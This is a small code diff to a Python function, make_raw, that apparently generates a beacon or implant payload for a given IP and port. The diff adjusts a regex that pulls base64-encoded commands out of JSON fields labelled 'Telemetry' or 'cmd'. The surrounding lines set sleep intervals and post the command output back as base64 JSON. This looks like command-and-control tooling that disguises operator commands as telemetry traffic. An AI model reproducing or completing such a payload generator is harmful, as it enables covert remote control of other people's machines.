@@ -97,7 +97,7 @@ def make_raw(ip, port, cfg=None, scheme="https"):
 		accept_line = host_line = range_line = ""
 		accept_post = ""
 		sleep_short, sleep_long = 2000, 5000
-		probe_union = '\\"Telemetry\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"|(?:\\"cmd\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\")'
+		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
 		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'
 
 	payload = f"""
